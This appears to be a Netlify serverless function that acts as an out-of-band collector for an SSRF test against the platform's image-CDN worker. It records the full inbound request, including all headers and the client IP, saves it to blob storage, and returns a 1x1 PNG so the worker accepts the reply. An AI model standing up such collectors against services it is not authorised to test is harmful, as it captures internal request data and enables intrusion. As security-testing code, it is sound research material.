// Out-of-band collector for the image-CDN SSRF test.
// Captures the FULL inbound request the Netlify image worker makes, persists it,
// and returns a valid 1x1 PNG so the worker accepts the response.
// Collector runs on my own Netlify site -- no third party is used.
import { getStore } from '@netlify/blobs'

const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
  'base64'
)

async function persist(rec) {
  const notes = []
  // path 1: implicit blobs context (should work inside a function)
  try {
    const s = getStore('cherry-oob')
    await s.set(rec.key, JSON.stringify(rec, null, 2))
    notes.push('implicit:ok')
  } catch (e) {
    notes.push('implicit:' + (e?.message || String(e)).slice(0, 120))
  }
  // path 2: explicit siteID + token, in case the implicit context is absent
  try {
    const siteID = process.env.SITE_ID
    const token = process.env.CHERRY_BLOB_TOKEN
    if (siteID && token) {
      const s2 = getStore({ name: 'cherry-oob', siteID, token })
      await s2.set(rec.key + '-x', JSON.stringify(rec, null, 2))
      notes.push('explicit:ok')
    } else {
      notes.push('explicit:skipped(no SITE_ID/CHERRY_BLOB_TOKEN)')
    }
  } catch (e) {
    notes.push('explicit:' + (e?.message || String(e)).slice(0, 120))
  }
  // path 3: raw REST with my own PAT, the most reliable of the three
  try {
    const siteID = process.env.SITE_ID
    const token = process.env.CHERRY_BLOB_TOKEN
    if (siteID && token) {
      const r = await fetch(
        `https://api.netlify.com/api/v1/blobs/${siteID}/cherry-oob/${rec.key}-rest`,
        { method: 'PUT', headers: { authorization: `Bearer ${token}` }, body: JSON.stringify(rec, null, 2) }
      )
      notes.push('rest:' + r.status)
    } else {
      notes.push('rest:skipped')
    }
  } catch (e) {
    notes.push('rest:' + (e?.message || String(e)).slice(0, 120))
  }
  return notes
}

export default async (req, context) => {
  const rec = {
    key: `hit-${Date.now()}-${Math.floor(Math.random() * 1e6)}`,
    ts: new Date().toISOString(),
    method: req.method,
    url: req.url,
    headers: Object.fromEntries(req.headers.entries()),
    ip: context?.ip ?? null,
  }
  const notes = await persist(rec)
  if (new URL(req.url).searchParams.get('mode') === 'json') {
    return new Response(JSON.stringify({ ...rec, persist: notes }, null, 2), {
      headers: { 'content-type': 'application/json' },
    })
  }
  return new Response(PNG, { headers: { 'content-type': 'image/png' } })
}
